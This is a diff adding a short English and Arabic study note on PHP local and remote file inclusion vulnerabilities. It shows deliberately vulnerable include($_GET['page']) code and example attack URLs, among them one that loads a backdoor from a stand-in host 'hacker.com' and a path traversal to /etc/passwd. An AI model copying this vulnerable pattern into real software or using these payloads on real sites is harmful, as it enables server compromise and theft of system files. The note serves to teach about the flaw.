@@ -1,0 +1,42 @@
+These is Remote\local file execution : 
+- Local file exec depends on execute a file or a commond in the url .
+- The file or command doesn't filterate they are trusted from the admin .
+- Example url : "https://www.google.com?page=email.html" .
+- by replacing email.html with the location of the file we want to open .  
+- When you try searching the directories or files in the system you can use dirsearch or dirbuster 
+- The php file code like : 
+	<?php
+             include($_GET['page']);
+        ?>
+- GET here will take any entery from the user . 
+ الان لنفهم بشكل أوضح الثغرة سنقوم بعرض سيناريو مبسط ، لنعتبر أننا نتوفر على موقع
+ http://donhackingarticles.com مثلا ، و هذا الموقع يتوفر على 3 فئات hacking و Security و ِContact ، وهذه الفئات يتم التحكم فيها عن طريق الملفات hacking.php ، Securtiy.php و Contact.php .
+
+و باستعمال Include يمكن استدعاء الصفحات الثلاث عن طريق الرابط :
+
+http://donhackingarticles.com?page=contact
+http://donhackingarticles.com?page=hacking
+http://donhackingarticles.com?page=security
+
+وطبعا الكود المستعمل يأخد فيه المتغير Page القيمة التي يتلقاها من المستعمل :
+
+<?php
+  include(“$_GET[‘page’].php”);
+?>
+
+اي مكن استغلاله عن طريق ثغرة RFI و استدعاء سكريبت من موقع خاص بالهاكر على الشكل التالي :
+http://donhackingarticles.com?page=http://hacker.com/backdoor.php
+
+أو استغلاله
+ عن طريق ثغرة LFI و استدعاء ملف حساس من سيرفر الضحية :
+
+http://donhackingarticles.com?page=../../../etc/passwd
+
+ويمكن أن تقوم بتضمين
+ سكريبت به ثغر
+ة XSS ليتم تفعيله بمتصفح الزائر وهذا أخطر شيء.
+- This is from : 
+	<https://donhackingarticles.blogspot.com/2016/12/rfi-lfi.html> 
+- Allow-url-open & Allow-url-include should be OOOnn .
+----------------------------------------------------- 
+- Remote file exec by uploading a file into the server .
